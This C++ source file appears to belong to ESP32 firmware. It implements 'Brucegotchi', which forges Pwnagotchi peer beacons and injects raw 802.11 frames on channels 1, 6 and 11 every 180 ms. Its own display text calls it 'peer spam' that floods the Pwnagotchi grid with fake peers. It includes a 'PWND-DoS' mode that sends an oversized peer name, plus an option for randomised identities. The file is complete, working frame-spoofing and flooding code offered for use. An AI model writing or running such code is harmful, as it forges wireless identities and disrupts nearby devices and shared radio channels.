/*
 * Brucegotchi — see header.
 *
 * JSON for Pwnagotchi peer beacon, hand-crafted (avoids ArduinoJson dep):
 *   {"pal":true,"name":"X","face":"Y","epoch":1,"grid_version":"1.10.3",
 *    "identity":"<sha-ish>","pwnd_run":0,"pwnd_tot":0,
 *    "session_id":"a2:00:64:e6:0b:8b","timestamp":0,"uptime":0,
 *    "version":"1.8.4",
 *    "policy":{"advertise":true,"bond_encounters_factor":20000,
 *              "bored_num_epochs":0,"sad_num_epochs":0,
 *              "excited_num_epochs":9999}}
 *
 * Wrapped in 802.11 vendor IE chunks of <=255 bytes (tag 0xDE).
 */

#include "brucegotchi.h"
#include "wificonfig.h"
#include "utils.h"
#include "Touchscreen.h"

#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <esp_random.h>
#include <string.h>
#include <stdio.h>

#define DARK_GRAY 0x4208

#define BTN_UP    6
#define BTN_DOWN  3

namespace Brucegotchi {

static const uint8_t beacon_template[37] = {
  0x80, 0x00, 0x00, 0x00,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xde, 0xad, 0xbe, 0xef, 0xde, 0xad,
  0xde, 0xad, 0xbe, 0xef, 0xde, 0xad,
  0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x64, 0x00,
  0x11, 0x04,
  0x00  // pad — actual frame is 36 bytes; we'll write up to 36 from this
};

static const char* faces_regular[] = {
  "(STOP)", "(X.X)", "(uWu)", "(EVIL)", "(@.@)",
  "(0.0)", "(o_O)", "(o.O)", "(>.<)", "(^.^)",
  "(-.-)", "(*.*)", "(T.T)"
};
static const char* names_regular[] = {
  "Hydra-says-hi", "STOP-deauth-skidz", "system-breached",
  "anon-pwn-buddy", "ESPDIV-here", "rogue-friend",
  "h4ck-pal", "we-saw-you", "pwnagotchi-spam",
  "wifi-ghost", "Brucegotchi"
};
static const char* faces_pwnd[]  = { "NOPWND!" };
static const char* names_pwnd[]  = {
  "------------------------------------------------"
};

static const uint8_t channels[] = { 1, 6, 11 };
static const int nFacesReg = sizeof(faces_regular) / sizeof(faces_regular[0]);
static const int nNamesReg = sizeof(names_regular) / sizeof(names_regular[0]);
static const int nChan     = sizeof(channels) / sizeof(channels[0]);

static bool      active = false;
static bool      pwndMode = false;
static bool      randomId = false;
static int       idxFace = 0;
static int       idxName = 0;
static int       idxChan = 0;
static uint32_t  totalFrames = 0;
static uint32_t  lastBtnMs = 0;
static const uint32_t BTN_DEBOUNCE_MS = 200;
static bool      toggleHeldFromPrev = true;
static uint32_t  lastUiUpdate = 0;
static uint32_t  lastSendMs = 0;
static const uint32_t SEND_INTERVAL_MS = 180;

static void hexId(char* out, int n) {
  static const char hex[] = "0123456789abcdef";
  for (int i = 0; i < n; i++) {
    out[i] = hex[esp_random() & 0xF];
  }
  out[n] = '\0';
}

static int buildPeerJson(char* json, int cap,
                         const char* face, const char* name) {
  char ident[65];
  if (randomId) {
    hexId(ident, 64);
  } else {
    strncpy(ident, "32e9f315e92d974342c93d0fd952a914bfb4e6838953536ea6f63d54db6b9610", 65);
  }
  return snprintf(json, cap,
    "{\"pal\":true,\"name\":\"%s\",\"face\":\"%s\",\"epoch\":1,"
    "\"grid_version\":\"1.10.3\",\"identity\":\"%s\","
    "\"pwnd_run\":0,\"pwnd_tot\":0,"
    "\"session_id\":\"a2:00:64:e6:0b:8b\",\"timestamp\":0,\"uptime\":0,"
    "\"version\":\"1.8.4\","
    "\"policy\":{\"advertise\":true,\"bond_encounters_factor\":20000,"
    "\"bored_num_epochs\":0,\"sad_num_epochs\":0,"
    "\"excited_num_epochs\":9999}}",
    name, face, ident);
}

static void sendBeacon(uint8_t channel, const char* face, const char* name) {
  char json[640];
  int jlen = buildPeerJson(json, sizeof(json), face, name);
  if (jlen <= 0) return;
  if (jlen > 600) jlen = 600;

  // Header (36 bytes) + IE chunks (each: 0xDE, len, up to 255 bytes)
  uint8_t frame[36 + 700];
  memcpy(frame, beacon_template, 36);

  int off = 36;
  int wrote = 0;
  while (wrote < jlen) {
    int chunk = jlen - wrote;
    if (chunk > 255) chunk = 255;
    if (off + 2 + chunk > (int)sizeof(frame)) break;
    frame[off++] = 0xDE;          // vendor IE tag
    frame[off++] = (uint8_t)chunk;
    memcpy(frame + off, json + wrote, chunk);
    off += chunk;
    wrote += chunk;
  }

  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  delay(1);
  esp_wifi_80211_tx(WIFI_IF_AP, frame, off, false);
  totalFrames++;
}

static void drawTopStatus() {
  tft.fillRect(35, 20, 205, 16, DARK_GRAY);
  tft.setTextFont(1); tft.setTextSize(1);
  tft.setTextColor(active ? TFT_RED : TFT_WHITE);
  tft.setCursor(35, 24);
  tft.printf("Brucegotchi  %u TX", (unsigned)totalFrames);
  tft.setTextColor(active ? TFT_GREEN : TFT_DARKGREY);
  tft.setCursor(170, 24);
  tft.print(active ? "ACTIVE" : "PAUSED");
}

static void drawInfoBlock() {
  tft.fillRect(0, 45, tft.width(), tft.height() - 60, TFT_BLACK);
  tft.setTextFont(1); tft.setTextSize(1);

  tft.setTextColor(TFT_YELLOW);
  tft.setCursor(2, 50);
  tft.print("Brucegotchi (peer spam)");

  tft.setTextColor(TFT_DARKGREY);
  tft.setCursor(2, 65);
  tft.print("Floods Pwnagotchi grid w/ fake peers");

  tft.setTextColor(TFT_WHITE);
  tft.setCursor(2, 85);
  tft.print("[UP]    Toggle ON/OFF");
  tft.setCursor(2, 100);
  tft.print("[DOWN]  Cycle mode (Reg/PWND/RND)");
  tft.setCursor(2, 115);
  tft.print("[SEL]   Exit");

  tft.setTextColor(TFT_CYAN);
  tft.setCursor(2, 140);
  tft.printf("Mode:   %s%s",
             pwndMode ? "PWND-DoS" : "Regular",
             randomId ? " + randID" : "");
  tft.setCursor(2, 155);
  tft.printf("Channels: 1, 6, 11  (now %d)", (int)channels[idxChan]);

  tft.setTextColor(TFT_WHITE);
  tft.setCursor(2, 180);
  tft.printf("Faces: %d  Names: %d",
             pwndMode ? 1 : nFacesReg,
             pwndMode ? 1 : nNamesReg);

  tft.setTextColor(TFT_GREEN);
  tft.setCursor(2, 200);
  tft.printf("TX: %u beacons", (unsigned)totalFrames);
}

void brucegotchiSetup() {
  tft.fillScreen(TFT_BLACK);
  setupTouchscreen();
  pcf.pinMode(BTN_UP, INPUT_PULLUP);
  pcf.pinMode(BTN_DOWN, INPUT_PULLUP);

  active = false;
  pwndMode = false;
  randomId = false;
  idxFace = idxName = idxChan = 0;
  totalFrames = 0;
  toggleHeldFromPrev = true;

  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();
  esp_wifi_set_mode(WIFI_MODE_AP);
  esp_wifi_start();

  Serial.println("[Brucegotchi] ready");

  float v = readBatteryVoltage();
  drawStatusBar(v, false);
  tft.fillRect(0, 20, 240, 16, DARK_GRAY);
  drawInfoBlock();
  drawTopStatus();
  lastUiUpdate = millis();
  lastSendMs = millis();
}

void brucegotchiLoop() {
  tft.drawLine(0, 19, 240, 19, TFT_WHITE);
  uint32_t now = millis();

  bool up = !pcf.digitalRead(BTN_UP);
  bool down = !pcf.digitalRead(BTN_DOWN);
  bool any = up || down;

  if (toggleHeldFromPrev) {
    if (!any) toggleHeldFromPrev = false;
  } else if (any && now - lastBtnMs > BTN_DEBOUNCE_MS) {
    if (up) {
      active = !active;
      Serial.printf("[Brucegotchi] %s\n", active ? "STARTED" : "PAUSED");
    } else if (down) {
      // cycle: Regular -> PWND-DoS -> Regular+randID -> PWND+randID -> Regular
      if (!pwndMode && !randomId)      { pwndMode = true;  randomId = false; }
      else if (pwndMode && !randomId)  { pwndMode = false; randomId = true;  }
      else if (!pwndMode && randomId)  { pwndMode = true;  randomId = true;  }
      else                              { pwndMode = false; randomId = false; }
    }
    lastBtnMs = now;
    toggleHeldFromPrev = true;
    drawInfoBlock();
    drawTopStatus();
  }

  if (active && now - lastSendMs >= SEND_INTERVAL_MS) {
    lastSendMs = now;
    const char* face;
    const char* name;
    if (pwndMode) {
      face = faces_pwnd[0];
      name = names_pwnd[0];
    } else {
      face = faces_regular[idxFace];
      name = names_regular[idxName];
      idxFace = (idxFace + 1) % nFacesReg;
      idxName = (idxName + 1) % nNamesReg;
    }
    sendBeacon(channels[idxChan], face, name);
    idxChan = (idxChan + 1) % nChan;
  }

  if (now - lastUiUpdate > 300) {
    drawTopStatus();
    lastUiUpdate = now;
  }

  delay(2);
}

}  // namespace Brucegotchi
